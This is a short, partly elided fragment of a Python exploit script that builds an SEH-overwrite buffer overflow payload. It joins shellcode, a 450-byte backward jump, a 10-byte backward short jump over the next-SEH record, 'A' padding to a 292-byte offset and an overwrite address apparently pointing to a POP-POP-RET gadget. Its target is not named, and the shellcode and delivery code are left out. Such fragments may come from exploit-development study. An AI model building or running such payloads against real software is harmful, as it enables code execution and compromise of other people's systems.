...
try:
    ...
    shellcode += b"\x99\x49"
    jmp450_stage2 = b"\x90\x90\x90\xE9\xe0\xfe\xFF\xFF" # Have it hit our long jump back 450
    nseh_stage1 = b"\x90\x90\xEB\xF6" # JMP back 10 bytes
    inputBuffer = shellcode
    inputBuffer += b"A"*(292-len(nseh_stage1+jmp450_stage2+shellcode))
    inputBuffer += jmp450_stage2
    inputBuffer += nseh_stage1
    inputBuffer += pack("<L",(0x00404124))
